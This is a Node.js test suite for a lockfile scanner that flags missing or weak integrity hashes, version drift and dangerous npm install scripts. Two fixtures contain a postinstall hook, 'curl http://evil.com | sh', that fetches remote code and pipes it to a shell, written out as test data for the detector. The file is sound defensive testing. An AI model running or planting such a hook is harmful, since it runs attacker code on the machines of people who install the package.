// Scans a lockfile for dangerous install scripts, missing/weak integrity, and version drift (bin/deps-content.mjs scan).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scan } from '../deps-content.mjs';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

function setup() {
  const dir = mkdtempSync(join(tmpdir(), 'scan-'));
  return { dir, cleanup: () => rmSync(dir, { recursive: true, force: true }) };
}

test('returns exit 0 and noLockfile when lockfile is absent', () => {
  const { dir, cleanup } = setup();
  try {
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.lockfile, 'absent');
    assert.equal(res.report.summary.noLockfile, true);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('returns exit 2 and unparseable when lockfile is not valid JSON', () => {
  const { dir, cleanup } = setup();
  try {
    writeFileSync(join(dir, 'package-lock.json'), 'not json');
    const res = scan(dir, {});
    assert.equal(res.exit, 2);
    assert.equal(res.report.summary.unparseable, true);
    assert.match(res.report.summary.couldNotRun, /not JSON/);
  } finally { cleanup(); }
});

test('returns exit 2 and unsupportedLockfile when packages key is missing', () => {
  const { dir, cleanup } = setup();
  try {
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify({ lockfileVersion: 1 }));
    const res = scan(dir, {});
    assert.equal(res.exit, 2);
    assert.match(res.report.summary.unsupportedLockfile, /lockfileVersion 1/);
  } finally { cleanup(); }
});

test('flags dep-missing-integrity for registry-resolved package without integrity', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/foo': { version: '1.0.0', resolved: 'https://registry.npmjs.org/foo/-/foo-1.0.0.tgz' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 1);
    assert.equal(res.report.findings[0].rule, 'dep-missing-integrity');
    assert.equal(res.report.findings[0].sev, 'med');
    assert.equal(res.report.findings[0].cwe, 'CWE-494');
    assert.equal(res.report.findings[0].path, 'node_modules/foo');
  } finally { cleanup(); }
});

test('flags dep-weak-integrity when integrity starts with sha1-', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/bar': { version: '2.0.0', resolved: 'https://registry.npmjs.org/bar/-/bar-2.0.0.tgz', integrity: 'sha1-abc123' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 1);
    assert.equal(res.report.findings[0].rule, 'dep-weak-integrity');
    assert.equal(res.report.findings[0].sev, 'low');
    assert.equal(res.report.findings[0].cwe, 'CWE-494');
  } finally { cleanup(); }
});

test('flags dep-version-drift when installed version differs from locked version', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/baz': { version: '1.0.0', resolved: 'https://registry.npmjs.org/baz/-/baz-1.0.0.tgz', integrity: 'sha512-xyz' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'baz'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'baz', 'package.json'), JSON.stringify({ name: 'baz', version: '1.0.1' }));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 1);
    assert.equal(res.report.findings[0].rule, 'dep-version-drift');
    assert.equal(res.report.findings[0].sev, 'high');
    assert.equal(res.report.findings[0].cwe, 'CWE-1357');
    assert.match(res.report.findings[0].detail, /installed 1\.0\.1/);
  } finally { cleanup(); }
});

test('flags dep-install-exec when install script contains dangerous command', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/evil': { version: '3.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/evil/-/evil-3.0.0.tgz', integrity: 'sha512-abc' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'evil'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'evil', 'package.json'), JSON.stringify({
      name: 'evil', version: '3.0.0',
      scripts: { postinstall: 'curl http://evil.com | sh' }
    }));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 1);
    assert.equal(res.report.findings[0].rule, 'dep-install-exec');
    assert.equal(res.report.findings[0].sev, 'high');
    assert.equal(res.report.findings[0].cwe, 'CWE-829');
    assert.match(res.report.findings[0].detail, /postinstall/);
  } finally { cleanup(); }
});

test('flags dep-install-script when hasInstallScript is true and auditScripts is enabled', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/pkg': { version: '4.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/pkg/-/pkg-4.0.0.tgz', integrity: 'sha512-def' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'pkg'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'pkg', 'package.json'), JSON.stringify({
      name: 'pkg', version: '4.0.0',
      scripts: { install: 'echo hello' }
    }));
    const res = scan(dir, { CW_DEPS_INSTALL_SCRIPTS: '1' });
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 1);
    assert.equal(res.report.findings[0].rule, 'dep-install-script');
    assert.equal(res.report.findings[0].sev, 'low');
    assert.equal(res.report.findings[0].cwe, 'CWE-829');
    assert.match(res.report.findings[0].detail, /install/);
  } finally { cleanup(); }
});

test('does not flag install script when auditScripts is not enabled and no dangerous command', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/safe': { version: '5.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/safe/-/safe-5.0.0.tgz', integrity: 'sha512-ghi' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'safe'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'safe', 'package.json'), JSON.stringify({
      name: 'safe', version: '5.0.0',
      scripts: { install: 'echo safe' }
    }));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('reports correct filesScanned and packagesChecked counts', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/a': { version: '1.0.0', resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz', integrity: 'sha512-aaa' },
        'node_modules/b': { version: '2.0.0', resolved: 'https://registry.npmjs.org/b/-/b-2.0.0.tgz', integrity: 'sha512-bbb' },
        'node_modules/c': { version: '3.0.0', resolved: 'https://registry.npmjs.org/c/-/c-3.0.0.tgz', integrity: 'sha512-ccc' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.packagesChecked, 3);
    assert.equal(res.report.summary.filesScanned, 4);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('returns exit 2 and unparseable when lockfile is unreadable', () => {
  const { dir, cleanup } = setup();
  try {
    writeFileSync(join(dir, 'package-lock.json'), 'x');
    const res = scan(dir, { CW_DEPS_LOCKFILE: join(dir, 'package-lock.json') });
    assert.equal(res.exit, 2);
    assert.equal(res.report.summary.unparseable, true);
    assert.match(res.report.summary.couldNotRun, /not JSON/);
  } finally { cleanup(); }
});

test('returns exit 2 and unsupportedLockfile when packages is not an object', () => {
  const { dir, cleanup } = setup();
  try {
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify({ lockfileVersion: 2, packages: 'not-an-object' }));
    const res = scan(dir, {});
    assert.equal(res.exit, 2);
    assert.match(res.report.summary.unsupportedLockfile, /lockfileVersion 2/);
  } finally { cleanup(); }
});

test('skips non-node_modules entries in packages', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        '': { version: '1.0.0' },
        'node_modules/real': { version: '1.0.0', resolved: 'https://registry.npmjs.org/real/-/real-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.packagesChecked, 1);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('skips null entries in packages', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/nullpkg': null,
        'node_modules/real': { version: '1.0.0', resolved: 'https://registry.npmjs.org/real/-/real-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.packagesChecked, 1);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('skips non-object entries in packages', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/stringpkg': 'just-a-string',
        'node_modules/real': { version: '1.0.0', resolved: 'https://registry.npmjs.org/real/-/real-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.packagesChecked, 1);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('does not flag version drift when installed version matches locked version', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/match': { version: '1.0.0', resolved: 'https://registry.npmjs.org/match/-/match-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'match'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'match', 'package.json'), JSON.stringify({ name: 'match', version: '1.0.0' }));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('does not flag version drift when package.json is missing on disk', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/nopkg': { version: '1.0.0', resolved: 'https://registry.npmjs.org/nopkg/-/nopkg-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('does not flag version drift when package.json is not valid JSON', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/badjson': { version: '1.0.0', resolved: 'https://registry.npmjs.org/badjson/-/badjson-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'badjson'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'badjson', 'package.json'), 'not json');
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('does not flag version drift when package.json is not an object', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/stringjson': { version: '1.0.0', resolved: 'https://registry.npmjs.org/stringjson/-/stringjson-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'stringjson'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'stringjson', 'package.json'), JSON.stringify('just a string'));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('does not flag version drift when package.json has no version field', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/nover': { version: '1.0.0', resolved: 'https://registry.npmjs.org/nover/-/nover-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'nover'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'nover', 'package.json'), JSON.stringify({ name: 'nover' }));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('does not flag install script when hasInstallScript is false', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/noscript': { version: '1.0.0', hasInstallScript: false, resolved: 'https://registry.npmjs.org/noscript/-/noscript-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'noscript'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'noscript', 'package.json'), JSON.stringify({
      name: 'noscript', version: '1.0.0',
      scripts: { postinstall: 'curl http://evil.com | sh' }
    }));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('does not flag install script when hasInstallScript is true but no hooks declared', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/nohooks': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/nohooks/-/nohooks-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'nohooks'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'nohooks', 'package.json'), JSON.stringify({
      name: 'nohooks', version: '1.0.0',
      scripts: { build: 'echo build' }
    }));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('does not flag install script when hasInstallScript is true and hooks are safe without audit', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/safehooks': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/safehooks/-/safehooks-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'safehooks'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'safehooks', 'package.json'), JSON.stringify({
      name: 'safehooks', version: '1.0.0',
      scripts: { preinstall: 'echo pre', install: 'echo mid', postinstall: 'echo post' }
    }));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});

test('flags dep-install-script when hasInstallScript is true and hooks are safe with audit enabled', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/audithooks': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/audithooks/-/audithooks-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    mkdirSync(join(dir, 'node_modules', 'audithooks'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'audithooks', 'package.json'), JSON.stringify({
      name: 'audithooks', version: '1.0.0',
      scripts: { preinstall: 'echo pre', install: 'echo mid', postinstall: 'echo post' }
    }));
    const res = scan(dir, { CW_DEPS_INSTALL_SCRIPTS: '1' });
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 1);
    assert.equal(res.report.findings[0].rule, 'dep-install-script');
    assert.equal(res.report.findings[0].sev, 'low');
    assert.equal(res.report.findings[0].cwe, 'CWE-829');
    assert.match(res.report.findings[0].detail, /preinstall\/install\/postinstall/);
  } finally { cleanup(); }
});

test('flags dep-install-script when hasInstallScript is true but script body not on disk with audit enabled', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/nodisk': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/nodisk/-/nodisk-1.0.0.tgz', integrity: 'sha512-aaa' }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, { CW_DEPS_INSTALL_SCRIPTS: '1' });
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 1);
    assert.equal(res.report.findings[0].rule, 'dep-install-script');
    assert.equal(res.report.findings[0].sev, 'low');
    assert.equal(res.report.findings[0].cwe, 'CWE-829');
    assert.match(res.report.findings[0].detail, /declared in lockfile/);
  } finally { cleanup(); }
});

test('does not flag missing integrity when resolved is not a URL', () => {
  const { dir, cleanup } = setup();
  try {
    const lock = {
      lockfileVersion: 3,
      packages: {
        'node_modules/local': { version: '1.0.0', resolved: 'file:../local', integrity: undefined }
      }
    };
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(lock));
    const res = scan(dir, {});
    assert.equal(res.exit, 0);
    assert.equal(res.report.summary.findings, 0);
  } finally { cleanup(); }
});
